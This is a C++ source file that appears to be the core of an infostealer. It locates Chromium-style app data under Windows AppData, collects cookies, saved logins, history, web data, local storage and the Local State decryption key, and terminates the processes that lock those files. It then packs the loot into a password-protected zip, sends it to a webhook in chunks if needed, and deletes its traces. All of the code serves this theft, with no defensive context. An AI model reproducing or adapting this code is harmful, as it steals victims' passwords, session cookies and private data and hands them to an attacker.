#include "adr.h"

ADR::ADR() : hook(WEBHOOK_TOKEN, WEBHOOK_ID), errors(0) {}

ADR::~ADR() {}

int ADR::start() {
  std::vector<std::string> targets = {HPathGetWinFld(FOLDERID_LocalAppData),
                                      HPathGetWinFld(FOLDERID_LocalAppDataLow),
                                      HPathGetWinFld(FOLDERID_RoamingAppData)};
  this->SearchTargets(targets, "blob_storage");

  if (!this->CreateZipPack()) return EXIT_FAILURE;
  if (!this->SendPack()) return EXIT_FAILURE;

  return EXIT_SUCCESS;
}

void ADR::SearchTargets(const std::vector<std::string>& targets,
                        const std::string& search) {
  for (std::string target : targets) {
    std::vector<std::string> tmp_results;
    SearchLinear(target, search, tmp_results);

    for (const std::string& res : tmp_results) {
      if (HPathIsFld(HPathGetParent(res))) {
        results.push_back(HPathGetParent(res));
      }
    }
  }
}

bool ADR::CreateZipPack() {
  this->zipOutName = "pack_" + HStringGetUUID('_');
  this->zipOutPath = HPathGetWinTmp(zipOutName + ".zip");
  this->zipPassword = HStringGetRandom(20);

  this->hz = CreateZip(HStringToANSI(zipOutPath), zipPassword.c_str());
  if (!this->hz) {
    return false;
  }

  this->configPath = HPathGetWinTmp(zipOutName + ".ini");
  this->config = std::ofstream(this->configPath);

  for (std::string& folder : results) {
    if (!this->ProcessUserDataFolder(folder)) {
      this->config << "error = true\n";
      this->errors++;
    }
  }

  this->config.close();
  ZipAdd(this->hz, HStringToANSI(this->zipOutName + ".ini"),
         HStringToANSI(this->configPath));
}

std::vector<std::string> ADR::GetUserDataFiles(const std::string& path) {
  std::vector<std::string> dataFiles = {
      path + "Network\\Cookies", path + "History",
      path + "Web Data",         path + "Login Data",
      path + "Local State",      HPathGetParent(path) + "Local State"};
  std::vector<std::string> ldbFiles =
      HPathGetFiles(path + "Local Storage\\leveldb\\");

  ldbFiles.erase(std::remove_if(ldbFiles.begin(), ldbFiles.end(),
                                [](const std::string& path) {
                                  if (path.size() >= 4) {
                                    const std::string ext =
                                        path.substr(path.size() - 4);
                                    return !(ext == ".ldb" || ext == ".log");
                                  }
                                  return true;
                                }),
                 ldbFiles.end());
  std::move(ldbFiles.begin(), ldbFiles.end(), std::back_inserter(dataFiles));

  dataFiles.erase(std::remove_if(dataFiles.begin(), dataFiles.end(),
                                 [](const std::string& path) {
                                   return !HPathIsFile(path);
                                 }),
                  dataFiles.end());

  return dataFiles;
}

bool ADR::ProcessUserDataFolder(const std::string& path) {
  std::string zipInFolderName = "pack_" + HStringGetUUID('_');
  this->config << "\n[" << zipInFolderName << "]\n";
  this->config << "path = \"" << path << "\"\n";

  ZRESULT zdRes = ZipAddFolder(this->hz, HStringToANSI(zipInFolderName));
  if (zdRes != ZR_OK) return false;

  std::vector<std::string> dataFiles = this->GetUserDataFiles(path);
  if (dataFiles.size() <= 0) return false;

  this->config << "files = " << dataFiles.size() << '\n';

  for (const std::string& filePath : dataFiles) {
    if (HPathGetName(filePath) != "Local State") continue;

    std::string key = HGetDecryptKey(filePath);

    if (key.empty()) continue;
    this->config << "key = \"" << key << "\"\n";
  }

  for (const std::string& file : dataFiles) {
    if (!HPathCanRead(file)) {
      std::vector<DWORD> ids;

      if (!HProcGetIdLockingFile(file, ids)) continue;
      if (ids.size() <= 0) continue;

      for (const DWORD& id : ids) {
        HProcTerminate(id);
      }

      std::chrono::high_resolution_clock::time_point start =
          std::chrono::high_resolution_clock::now();
      std::chrono::high_resolution_clock::time_point current;

      bool timeOut = false;
      while (!HPathCanRead(file)) {
        current = std::chrono::high_resolution_clock::now();
        std::chrono::duration<long long> diff =
            std::chrono::duration_cast<std::chrono::seconds>(current - start);
        if (diff.count() >= 5) {
          timeOut = true;
          break;
        }
        Sleep(100);
      }

      if (timeOut) continue;
    }

    ZRESULT zfRes =
        ZipAdd(hz, HStringToANSI(zipInFolderName + "\\" + HPathGetName(file)),
               HStringToANSI(file));
    if (zfRes != ZR_OK) continue;
  }

  return true;
}

bool ADR::SendPack() {
  CloseZip(this->hz);

  UserInfo userInfo = UserInfo();
  hook.embeds.emplace_back(userInfo.Build());

  if (!HPathIsFile(this->zipOutPath)) return false;
  size_t zipOutSizeMo = HPathFileSize(zipOutPath) / O_2_MO;

  WebhookEmbed embedZip;
  embedZip.SetTitle("ZIP");
  embedZip.SetColor(COLOR_1);

  embedZip.fields["Errors"] =
      std::to_string(this->errors) + "/" + std::to_string(this->results.size());
  embedZip.fields["Password"] = zipPassword;
  embedZip.fields["Size"] = std::to_string(zipOutSizeMo) + " Mo";

  if (zipOutSizeMo >= WEBHOOK_MAX_PACK_SIZE) {
    embedZip.fields["Chunk Id"] = this->zipOutName;
  }

  hook.embeds.emplace_back(embedZip);

  if (zipOutSizeMo < WEBHOOK_MAX_PACK_SIZE) {
    hook.files.emplace_back(zipOutPath);
    hook.Send();
  } else {
    hook.Send();

    std::vector<std::string> files =
        HChunkFile(zipOutPath, WEBHOOK_TARGET_PACK_SIZE * O_2_MO);
    for (const std::string& file : files) {
      Webhook chunkhook(WEBHOOK_TOKEN, WEBHOOK_ID);
      chunkhook.files.emplace_back(file);
      chunkhook.Send();

      DeleteFileA(file.c_str());
    }
  }

  DeleteFileA(this->configPath.c_str());
  DeleteFileA(this->zipOutPath.c_str());
}
